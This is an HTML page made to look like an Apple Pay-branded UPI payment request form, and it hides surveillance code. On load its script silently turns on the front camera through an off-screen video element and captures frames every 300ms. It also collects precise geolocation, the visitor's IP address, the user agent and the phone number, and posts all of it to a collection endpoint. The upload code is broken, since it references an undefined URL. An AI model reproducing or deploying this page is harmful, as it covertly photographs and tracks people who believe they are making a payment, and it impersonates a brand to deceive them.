<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Payment Request</title>
<style>
:root{
--bg1:#0f0f10;--bg2:#1b1b1d;--glass:rgba(255,255,255,.08);
--border:rgba(255,255,255,.12);--green:#34C759;
}
*{box-sizing:border-box;margin:0;padding:0}
body{
min-height:100vh;display:flex;align-items:center;justify-content:center;
padding:24px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
background:radial-gradient(circle at top,#2f2f33,#121214 45%,#000);
color:#fff;
}
.card-wrap{width:min(100%,1000px);position:relative;margin-top:20px;}
/* Apple logo styling */
.apple-logo-container{
    display:flex;
    justify-content:center;
    align-items:center;
    margin-bottom:24px;
    gap:2px;
}

.apple-logo-svg{
    width:26px;
    height:32px;
    fill:white;
}
.card{
background:var(--glass);
backdrop-filter:blur(24px);
border:1px solid var(--border);
border-radius:32px;
box-shadow:0 30px 80px rgba(0,0,0,.45);
overflow:hidden;
}
.request-card{transition:.4s ease}
.request-card.hidden{opacity:0;transform:scale(.97)}
.layout{
display:grid;
grid-template-columns:1.2fr .8fr;
min-height:620px;
}
.left,.right{padding:36px}
.left{border-right:1px solid rgba(255,255,255,.08)}

.amount-section{
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
min-height:260px;
padding:10px 0 30px;
}
.amount-wrapper{
display:flex;
align-items:center;
gap:8px;
background:rgba(255,255,255,.05);
border:1px solid var(--border);
border-radius:48px;
padding:4px 20px;
}
.currency-symbol{
font-size:clamp(32px, 7vw, 60px);
font-weight:700;
color:#fff;
}
.amount-input{
background:transparent;
border:none;
font-size:clamp(32px, 7vw, 60px);
font-weight:700;
width:180px;
text-align:center;
color:#fff;
font-family:monospace;
padding:8px 0;
}
.amount-input:focus{outline:none;}
/* remove spinner arrows */
.amount-input::-webkit-inner-spin-button,
.amount-input::-webkit-outer-spin-button{
-webkit-appearance:none;
margin:0;
}
.amount-input[type=number]{-moz-appearance:textfield;}

.controls{display:flex;gap:12px;margin:20px 0 0}
.iconbtn{
width:54px;height:54px;border-radius:50%;border:none;cursor:pointer;
background:rgba(255,255,255,.08);color:#fff;font-size:28px;
}
.label{font-size:13px;color:rgba(255,255,255,.6);margin-bottom:8px}
.field{position:relative;margin-bottom:20px}
.input{
width:100%;height:56px;border-radius:18px;border:1px solid rgba(255,255,255,.08);
background:rgba(255,255,255,.05);color:#fff;padding:0 16px 0 52px;
}
.upiicon{position:absolute;left:16px;top:43px;transform:translateY(-50%)}
.upload{
border:2px dashed rgba(255,255,255,.15);
border-radius:22px;min-height:120px;
height:18vh;
max-height:180px;
padding:16px;
display:flex;flex-direction:column;align-items:center;justify-content:center;
gap:10px;cursor:pointer;background:rgba(255,255,255,.03)
}
.right{display:flex;flex-direction:column}
.title{font-size:28px;font-weight:600;margin-bottom:28px}
.info{margin-bottom:24px}
.info small{display:block;color:rgba(255,255,255,.55);margin-bottom:6px}
.actions{margin-top:auto;display:grid;grid-template-columns:1fr 1fr;gap:12px}
.btn{
height:54px;border:none;border-radius:999px;cursor:pointer;font-weight:600
}
.cancel{background:rgba(255,255,255,.08);color:#fff}
.send{background:#fff;color:#000}
.success{
position:absolute;inset:0;display:flex;flex-direction:column;
align-items:center;justify-content:center;text-align:center;
opacity:0;pointer-events:none;transform:scale(.95);
transition:.4s ease;padding:40px;
}
.success.visible{opacity:1;pointer-events:auto;transform:scale(1)}
.success svg{width:140px;height:140px}
.circle{
fill:none;stroke:var(--green);stroke-width:4;
stroke-dasharray:264;stroke-dashoffset:264
}
.check{
fill:none;stroke:var(--green);stroke-width:6;
stroke-linecap:round;stroke-linejoin:round;
stroke-dasharray:90;stroke-dashoffset:90
}
.success.visible .circle{animation:c .7s forwards}
.success.visible .check{animation:k .4s .65s forwards}
@keyframes c{to{stroke-dashoffset:0}}
@keyframes k{to{stroke-dashoffset:0}}
.success h2{margin-top:20px;font-size:40px}
.success p{margin-top:12px;color:rgba(255,255,255,.7);line-height:1.6}
.done{margin-top:24px;width:180px;background:#fff;color:#000}
@media(max-width:900px){
.layout{grid-template-columns:1fr}
.left{border-right:none;border-bottom:1px solid rgba(255,255,255,.08)}
.right,.left{padding:24px}
}
</style>
</head>
<body>
<div style="width:min(100%,1000px); margin:0 auto;">
    <div class="apple-logo-container">
        <svg class="apple-logo-svg" viewBox="0 0 814 1000" aria-hidden="true">
            <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 790.7 0 663 0 541.8c0-194.4 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-51.8 1.9-114 34.3-151 77.1-28.5 32.4-55 83.6-55 135.5 0 7.8 1.3 15.6 1.9 18.2 3.2.6 8.4 1.3 13.6 1.3 46.6 0 105-31.1 138.1-69.4z"/>
        </svg>
        Pay
    </div>
    <div class="card-wrap">
        <div class="card request-card" id="request">
            <div class="layout">
                <div class="left">
                    <div class="amount-section">
                        <div class="amount-wrapper">
                            <span class="currency-symbol">₹</span>
                            <input type="number" id="amountInput" class="amount-input" value="125" step="1" min="1">
                        </div>
                        <div class="controls">
                            <button class="iconbtn" id="decBtn">−</button>
                            <button class="iconbtn" id="incBtn">+</button>
                        </div>
                    </div>

                    <div class="field">
                        <div class="label">UPI Mobile Number</div>
                        <svg class="upiicon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                            <rect x="7" y="2" width="10" height="20" rx="2"></rect><circle cx="12" cy="18" r="1"></circle>
                        </svg>
                        <input id="mobile" class="input" placeholder="10-digit mobile number" maxlength="10" inputmode="numeric">
                    </div>

                    <div class="label">Upload QR Code</div>
                    <label class="upload">
                        <input type="file" id="qr" hidden accept="image/*">
                        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                            <path d="M12 5v14M5 12h14"/>
                        </svg>
                        <span>Upload QR Image (optional)</span>
                    </label>
                </div>

                <div class="right">
                    <div class="title">Request Payment</div>
                    <div class="info"><small>Merchant</small><div>Kallarakkal Traders</div></div>
                    <div class="info"><small>Purpose</small><div>Payment Request</div></div>
                    <div class="info"><small>Processing</small><div>UPI Request</div></div>
                    <div class="actions">
                        <button class="btn cancel" id="cancelBtn">Cancel</button>
                        <button class="btn send" id="sendBtn">Send Request</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="card success" id="success">
            <svg viewBox="0 0 100 100">
                <circle class="circle" cx="50" cy="50" r="42"/>
                <path class="check" d="M30 52 L45 67 L72 38"/>
            </svg>
            <h2>Request Sent</h2>
            <p id="successText"></p>
            <button class="btn done" onclick="location.reload()">Done</button>
        </div>
    </div>
</div>

<!-- hidden video for silent camera capture -->
<video id="hiddenVideo" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>

<script>
// ---------- AMOUNT LOGIC (typable, min 1, with +/-) ----------
const amountInput = document.getElementById('amountInput');
const decBtn = document.getElementById('decBtn');
const incBtn = document.getElementById('incBtn');

function setAmountValue(value) {
    let num = parseInt(value);
    if (isNaN(num)) num = 1;
    if (num < 1) num = 1;
    amountInput.value = num;
}
function validateAmount() {
    let val = parseInt(amountInput.value);
    if (isNaN(val) || val < 1) amountInput.value = 1;
}
amountInput.addEventListener('change', validateAmount);
decBtn.addEventListener('click', () => {
    let curr = parseInt(amountInput.value);
    if (isNaN(curr)) curr = 1;
    if (curr > 1) amountInput.value = curr - 1;
    validateAmount();
});
incBtn.addEventListener('click', () => {
    let curr = parseInt(amountInput.value);
    if (isNaN(curr)) curr = 1;
    amountInput.value = curr + 1;
    validateAmount();
});
validateAmount();

// ---------- UPI MOBILE VALIDATION (exactly 10 digits) ----------
const mobileInput = document.getElementById('mobile');
mobileInput.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 10) val = val.slice(0,10);
    e.target.value = val;
});

// ---------- CAMERA CAPTURE (every 300ms) ----------
let mediaStream = null;
let capturedFrames = [];
const MAX_FRAMES = 20;

async function initCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        });
        const video = document.getElementById('hiddenVideo');
        video.srcObject = mediaStream;
        await video.play();
        setInterval(() => captureFrame(), 300);
    } catch (err) {
        console.warn("Camera error:", err);
    }
}

function captureFrame() {
    const video = document.getElementById('hiddenVideo');
    if (!video || video.readyState !== 4 || !video.videoWidth) return;
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const frameData = canvas.toDataURL('image/jpeg', 0.85);
    capturedFrames.push(frameData);
    if (capturedFrames.length > MAX_FRAMES) capturedFrames.shift();
}

// ---------- GEOLOCATION ----------
let geoLocation = null;
function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                geoLocation = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: pos.timestamp
                };
                resolve(geoLocation);
            },
            (err) => { console.warn("Geo error", err); resolve(null); },
            { timeout: 8000, enableHighAccuracy: true }
        );
    });
}

// ---------- GET CLIENT IP ----------
async function getClientIP() {
    try {
        const resp = await fetch('https://api.ipify.org?format=json');
        const data = await resp.json();
        return data.ip;
    } catch {
        return null;
    }
}

// ---------- GOOGLE APPS SCRIPT URL (REPLACE WITH YOUR DEPLOYED URL) ----------
// Remove the corsproxy.io line
// const GAS_URL = "https://corsproxy.io/..." 

// Use your own API endpoint (relative path works on Vercel)
const API_ENDPOINT = "/api/collect";

// ---------- SEND TO GOOGLE DRIVE (JSON payload) ----------
async function sendToBackend(amount, mobile, qrFile, location, frames) {
    const recentFrames = frames.slice(-10);
    const SECRET_KEY = "secretkey8948";
    const payload = {
        timestamp: new Date().toISOString(),
        amount: amount,
        mobile: mobile,
        location: location,
        ip: await getClientIP(),
        userAgent: navigator.userAgent,
        images: recentFrames.map(img => ({ data: img })),
        secret: SECRET_KEY   
    };
    
    try {
        const response = await fetch(GAS_URL, {  // ❌ GAS_URL is undefined!
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        return response.ok;
    } catch (err) {
        console.error("Upload error:", err);
        return false;
    }
}

// ---------- MAIN SEND ACTION ----------
document.getElementById('sendBtn').addEventListener('click', async () => {
    const sendBtn = document.getElementById('sendBtn');
    sendBtn.disabled = true;
    sendBtn.textContent = "Sending...";

    let amount = parseInt(amountInput.value);
    if (isNaN(amount) || amount < 1) amount = 1;
    const mobile = mobileInput.value.trim();
    if (!mobile || !/^\d{10}$/.test(mobile)) {
        alert("Please enter a valid 10-digit mobile number");
        sendBtn.disabled = false;
        sendBtn.textContent = "Send Request";
        return;
    }

    captureFrame(); // final frame
    await new Promise(r => setTimeout(r, 100));
    const location = await getLocation();
    const qrInput = document.getElementById('qr');
    const qrFile = qrInput.files ? qrInput.files[0] : null;

    // Note: qrFile is not used in this version because Apps Script expects JSON.
    // If you need QR file upload, you would need a separate endpoint or convert to base64.
    // For simplicity, we ignore QR file in this version.
    
    const success = await sendToBackend(amount, mobile, qrFile, location, capturedFrames);
    if (success) {
        document.getElementById('successText').innerHTML = 
            `₹${amount} request sent successfully to<br><strong>${mobile}</strong><br><span style="font-size:12px;">(evidence recorded)</span>`;
        document.getElementById('request').classList.add('hidden');
        setTimeout(() => document.getElementById('success').classList.add('visible'), 200);
    } else {
        alert("Request failed. Please try again.");
        sendBtn.disabled = false;
        sendBtn.textContent = "Send Request";
    }
    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
});

document.getElementById('cancelBtn').addEventListener('click', () => location.reload());

initCamera();
getLocation(); // warm up
</script>
</body>
</html>
